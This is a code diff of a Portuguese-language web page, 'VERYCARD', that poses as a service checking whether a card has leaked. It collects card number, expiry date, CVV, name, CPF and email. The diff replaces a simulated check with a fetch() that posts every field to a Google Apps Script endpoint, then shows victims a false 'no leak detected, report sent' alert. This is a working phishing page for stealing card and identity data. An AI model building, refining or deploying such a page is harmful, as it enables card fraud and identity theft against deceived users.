@@ -7,7 +7,7 @@
     <title>VERYCARD</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
-    <link rel="icon" href="https://i.imgur.com/HXSvcEF.png" type="image/jpeg">
+    <link rel="icon" href="https://imgur.com/HXSvcEF.png" type="image/png">
     <style>
         body {
             background: linear-gradient(135deg, #1E40AF 0%, #111827 100%);
@@ -81,19 +81,63 @@
             margin-top: 0.25rem;
             display: none;
         }
+        .error-message-general {
+            color: #EF4444;
+            font-size: 1rem;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 1rem;
+            display: none;
+            padding: 0.5rem;
+            background-color: #1f2937;
+            border-radius: 0.375rem;
+        }
+        .hamburger {
+            display: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+        @media (max-width: 640px) {
+            .hamburger {
+                display: block;
+            }
+            .nav-links {
+                display: none;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                right: 0;
+                background-color: #1f2937;
+                padding: 1rem;
+                flex-direction: column;
+                align-items: center;
+            }
+            .nav-links.active {
+                display: flex;
+            }
+            .nav-item {
+                margin: 0.5rem 0;
+            }
+        }
     </style>
 </head>
 <body class="min-h-screen flex flex-col">
     <header class="bg-gray-900 shadow-lg">
         <nav class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 flex justify-between items-center">
-            <div class="flex items-center space-x-2">
-                <img src="https://imgur.com/a/vrycard-LTwb73m.jpeg" alt="VERYCARD Logo" class="h-10">
+            <div class="flex items-center space-x-4">
+                <img src="https://imgur.com/HXSvcEF.png" alt="VERYCARD Logo" class="h-12">
                 <span class="logo">VERYCARD</span>
             </div>
-            <div class="space-x-4">
-                <a href="#home" class="text-gray-300 hover:text-white">Home</a>
-                <a href="#como-funciona" class="text-gray-300 hover:text-white">Como Funciona</a>
-                <a href="#contato" class="text-gray-300 hover:text-white">Contato</a>
+            <div class="flex items-center space-x-4">
+                <div class="md:hidden">
+                    <i class="fas fa-bars hamburger" onclick="toggleMenu()"></i>
+                </div>
+                <div class="nav-links" id="navLinks">
+                    <a href="#home" class="nav-item text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Home</a>
+                    <a href="#como-funciona" class="nav-item text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Como Funciona</a>
+                    <a href="#contato" class="nav-item text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Contato</a>
+                    <a href="#verificar" class="nav-item text-white bg-purple-700 hover:bg-purple-600 px-4 py-2 rounded-md text-sm font-medium">Verificar Agora</a>
+                </div>
             </div>
         </nav>
     </header>
@@ -118,14 +162,10 @@
                         <li><strong>CVV</strong>: Verso, 3 dígitos na faixa de assinatura.</li>
                     </ul>
                 </div>
-                <div class="grid grid-cols-2 gap-4">
-                    <div>
-                        <img src="https://images.pexels.com/photos/50987/money-card-business-credit-card-payment-finance-50987.jpeg?auto=compress&cs=tinysrgb&w=400" alt="Frente do cartão" class="card-info-img">
-                        <p class="text-sm text-gray-400 mt-2 text-center">Frente do cartão</p>
-                    </div>
-                    <div>
-                        <img src="https://images.pexels.com/photos/4968630/pexels-photo-4968630.jpeg?auto=compress&cs=tinysrgb&w=400" alt="Verso do cartão" class="card-info-img">
-                        <p class="text-sm text-gray-400 mt-2 text-center">Verso do cartão</p>
+                <div class="flex justify-center">
+                    <div class="text-center">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyJE8aaqPhgLRXrsYGCJ2NIdYU7Gswe8JotDgyNAM4IKa3wywCROuvNLS1&s=10" alt="Frente e verso do cartão" class="card-info-img">
+                        <p class="text-sm text-gray-400 mt-2">Frente e verso do cartão</p>
                     </div>
                 </div>
             </div>
@@ -154,6 +194,24 @@
                     <p id="cvvError" class="error-message">Deve conter 3 dígitos</p>
                 </div>
                 <div class="input-wrapper">
+                    <label class="block text-sm font-medium text-gray-300 mb-2">Tipo de Cartão</label>
+                    <div class="flex space-x-4">
+                        <label class="flex items-center">
+                            <input type="radio" name="cardType" value="debit" class="form-radio text-purple-600" required>
+                            <span class="ml-2 text-gray-300">Débito</span>
+                        </label>
+                        <label class="flex items-center">
+                            <input type="radio" name="cardType" value="credit" class="form-radio text-purple-600" required>
+                            <span class="ml-2 text-gray-300">Crédito</span>
+                        </label>
+                        <label class="flex items-center">
+                            <input type="radio" name="cardType" value="both" class="form-radio text-purple-600" required>
+                            <span class="ml-2 text-gray-300">Ambos</span>
+                        </label>
+                    </div>
+                    <p id="cardTypeError" class="error-message">Selecione o tipo de cartão</p>
+                </div>
+                <div class="input-wrapper">
                     <label for="fullName" class="block text-sm font-medium text-gray-300">Nome Completo</label>
                     <i class="fas fa-user input-icon"></i>
                     <input type="text" id="fullName" name="fullName" placeholder="João Silva" class="form-input" required>
@@ -171,8 +229,11 @@
                     <input type="email" id="email" name="email" placeholder="exemplo@dominio.com" class="form-input" required>
                     <p id="emailError" class="error-message">E-mail inválido</p>
                 </div>
-                <div class="md:col-span-2 text-center">
-                    <button type="submit" class="btn-primary text-white font-semibold py-3 px-6 rounded-lg"><i class="fas fa-shield-alt mr-2"></i> Verificar Agora</button>
+                <div class="md:col-span-2">
+                    <p id="generalError" class="error-message-general">Por favor, verifique e preencha todos os campos corretamente.</p>
+                    <div class="text-center">
+                        <button type="submit" class="btn-primary text-white font-semibold py-3 px-6 rounded-lg"><i class="fas fa-shield-alt mr-2"></i> Verificar Agora</button>
+                    </div>
                 </div>
             </form>
         </section>
@@ -196,23 +257,15 @@
                 var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                 var firstSheetName = workbook.SheetNames[0];
                 var worksheet = workbook.Sheets[firstSheetName];
-
-                // Convert sheet to JSON to filter blank rows
                 var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
-                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                 var filteredData = jsonData.filter(row => row.some(filledCell));
-
-                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
                 var headerRowIndex = filteredData.findIndex((row, index) =>
                   row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                 );
-                // Fallback
                 if (headerRowIndex === -1 || headerRowIndex > 25) {
                   headerRowIndex = 0;
                 }
-
-                // Convert filtered JSON back to CSV
-                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex));
                 csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                 return csv;
             } catch (e) {
@@ -224,9 +277,13 @@
         }
     </script>
     <script>
-        // Função para formatar o número do cartão (XXXX XXXX XXXX XXXX)
+        function toggleMenu() {
+            const navLinks = document.getElementById('navLinks');
+            navLinks.classList.toggle('active');
+        }
+
         function formatCardNumber(value) {
-            const digits = value.replace(/\D/g, '').slice(0, 16); // Apenas dígitos, máx 16
+            const digits = value.replace(/\D/g, '').slice(0, 16);
             let formatted = '';
             for (let i = 0; i < digits.length; i++) {
                 if (i > 0 && i % 4 === 0) formatted += ' ';
@@ -235,9 +292,8 @@
             return formatted;
         }
 
-        // Função para formatar o CPF (XXX.XXX.XXX-XX)
         function formatCPF(value) {
-            const digits = value.replace(/\D/g, '').slice(0, 11); // Apenas dígitos, máx 11
+            const digits = value.replace(/\D/g, '').slice(0, 11);
             let formatted = '';
             for (let i = 0; i < digits.length; i++) {
                 if (i === 3 || i === 6) formatted += '.';
@@ -247,21 +303,18 @@
             return formatted;
         }
 
-        // Função para formatar a data de validade (MM/AA)
         function formatExpiryDate(value) {
-            const digits = value.replace(/\D/g, '').slice(0, 4); // Apenas dígitos, máx 4
+            const digits = value.replace(/\D/g, '').slice(0, 4);
             if (digits.length >= 3) {
                 return digits.slice(0, 2) + '/' + digits.slice(2);
             }
             return digits;
         }
 
-        // Função para formatar o CVV (3 dígitos)
         function formatCVV(value) {
             return value.replace(/\D/g, '').slice(0, 3);
         }
 
-        // Aplicar formatação aos campos
         const inputs = {
             cardNumber: document.getElementById('cardNumber'),
             cpf: document.getElementById('cpf'),
@@ -273,7 +326,6 @@
             const cursorPosition = e.target.selectionStart;
             const oldValue = e.target.value;
             e.target.value = formatCardNumber(e.target.value);
-            // Ajustar posição do cursor
             const diff = e.target.value.length - oldValue.length;
             const newCursorPosition = cursorPosition + diff;
             e.target.setSelectionRange(newCursorPosition, newCursorPosition);
@@ -283,7 +335,6 @@
             const cursorPosition = e.target.selectionStart;
             const oldValue = e.target.value;
             e.target.value = formatCPF(e.target.value);
-            // Ajustar posição do cursor
             const diff = e.target.value.length - oldValue.length;
             const newCursorPosition = cursorPosition + diff;
             e.target.setSelectionRange(newCursorPosition, newCursorPosition);
@@ -293,7 +344,6 @@
             const cursorPosition = e.target.selectionStart;
             const oldValue = e.target.value;
             e.target.value = formatExpiryDate(e.target.value);
-            // Ajustar posição do cursor
             const diff = e.target.value.length - oldValue.length;
             const newCursorPosition = cursorPosition + diff;
             e.target.setSelectionRange(newCursorPosition, newCursorPosition);
@@ -303,60 +353,95 @@
             e.target.value = formatCVV(e.target.value);
         });
 
-        // Validação do formulário
         document.getElementById('verifyForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const formData = new FormData(this);
             const data = {
-                cardNumber: formData.get('cardNumber'),
-                expiryDate: formData.get('expiryDate'),
-                cvv: formData.get('cvv'),
-                fullName: formData.get('fullName'),
-                cpf: formData.get('cpf'),
-                email: formData.get('email')
+                cardNumber: formData.get('cardNumber').trim(),
+                expiryDate: formData.get('expiryDate').trim(),
+                cvv: formData.get('cvv').trim(),
+                cardType: formData.get('cardType'),
+                fullName: formData.get('fullName').trim(),
+                cpf: formData.get('cpf').trim(),
+                email: formData.get('email').trim()
             };
 
             // Resetar mensagens de erro
             document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
+            const generalError = document.getElementById('generalError');
+            generalError.style.display = 'none';
 
             // Validações
             let isValid = true;
+            console.log('Validando dados:', data);
             if (data.cardNumber.replace(/\D/g, '').length !== 16) {
+                console.log('Erro: Número do cartão inválido');
                 document.getElementById('cardNumberError').style.display = 'block';
                 isValid = false;
             }
             if (!/^\d{2}\/\d{2}$/.test(data.expiryDate)) {
+                console.log('Erro: Data de validade inválida');
                 document.getElementById('expiryDateError').style.display = 'block';
                 isValid = false;
             }
-            if (data.cvv.length !== 3) {
+            if (data.cvv.length !== 3 || isNaN(data.cvv)) {
+                console.log('Erro: CVV inválido');
                 document.getElementById('cvvError').style.display = 'block';
                 isValid = false;
             }
-            if (!data.fullName.trim()) {
+            if (!data.cardType) {
+                console.log('Erro: Tipo de cartão não selecionado');
+                document.getElementById('cardTypeError').style.display = 'block';
+                isValid = false;
+            }
+            if (!data.fullName) {
+                console.log('Erro: Nome obrigatório');
                 document.getElementById('fullNameError').style.display = 'block';
                 isValid = false;
             }
             if (data.cpf.replace(/\D/g, '').length !== 11) {
+                console.log('Erro: CPF inválido');
                 document.getElementById('cpfError').style.display = 'block';
                 isValid = false;
             }
             if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
+                console.log('Erro: E-mail inválido');
                 document.getElementById('emailError').style.display = 'block';
                 isValid = false;
             }
 
-            if (!isValid) return;
+            // Exibir mensagem geral se houver algum erro
+            if (!isValid) {
+                console.log('Exibindo mensagem de erro geral');
+                generalError.style.display = 'block';
+                return;
+            }
 
-            // Simulação de verificação com animação de loading
+            // Enviar dados para o Google Sheets
             const button = this.querySelector('button');
-            button.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Verificando...';
+            button.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Enviando...';
             button.classList.add('animate-pulse');
-            setTimeout(() => {
+
+            fetch('https://script.google.com/macros/s/AKfycbxOjhEU28wp0et3FkrE5UjbQWXRDkwBF0KxPkjQrNE3arfOwpehJ7WcC9fK64MODNEQ/exec', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams(data).toString()
+            })
+            .then(response => {
+                console.log('Dados enviados com sucesso');
                 button.innerHTML = '<i class="fas fa-shield-alt mr-2"></i> Verificar Agora';
                 button.classList.remove('animate-pulse');
-                alert(`Verificação concluída!\n\nNenhum vazamento detectado.\n\nDetalhes:\nCartão: ${data.cardNumber}\nCPF: ${data.cpf}\nNome: ${data.fullName}\nE-mail: ${data.email}\n\nUm relatório foi enviado para ${data.email}.`);
-            }, 2000);
+                alert(`Verificação concluída!\n\nNenhum vazamento detectado.\n\nDetalhes:\nCartão: ${data.cardNumber}\nTipo: ${data.cardType}\nCPF: ${data.cpf}\nNome: ${data.fullName}\nE-mail: ${data.email}\n\nUm relatório foi enviado para ${data.email}.`);
+            })
+            .catch(error => {
+                console.error('Erro ao enviar dados:', error);
+                button.innerHTML = '<i class="fas fa-shield-alt mr-2"></i> Verificar Agora';
+                button.classList.remove('animate-pulse');
+                alert('Erro ao salvar os dados. Tente novamente ou verifique a conexão.');
+            });
         });
     </script>
 </body>
